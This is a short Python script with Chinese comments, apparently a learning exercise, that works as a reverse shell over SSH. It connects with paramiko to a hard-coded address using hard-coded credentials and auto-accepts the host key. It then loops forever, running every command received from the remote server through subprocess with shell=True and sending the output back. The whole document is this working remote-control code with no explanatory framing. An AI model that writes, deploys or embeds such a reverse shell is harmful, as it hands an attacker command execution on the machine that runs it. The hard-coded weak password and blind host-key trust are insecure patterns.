#!/usr/bin/env python3
# coding=utf-8

import threading
import paramiko
import subprocess

def ssh_command(ip,user,passwd,command):
    # 建立一个sshclient对象
    client = paramiko.SSHClient()
    # client.load_host_keys("路径")
    # 允许将信任的主机自动加入到host_allow列表，此方法必须放在connect方法的前面
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # 连接服务器
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command.encode("utf-8"))
        # 输出banner信息
        print(ssh_session.recv(1024).decode("utf-8"))
        while True:
            # 从服务端获得命令
            command =ssh_session.recv(1024).decode("utf-8")
            try:
                cmd_output = subprocess.check_output(command,shell =True)
                ssh_session.send(str(cmd_output).encode("utf-8"))
            except Exception as e:
                ssh_session.send(str(e).encode("utf-8"))
        client.close()
    return
    #如何让command输出字符串
ssh_command("192.168.13.142","Star","123","ClientConnected")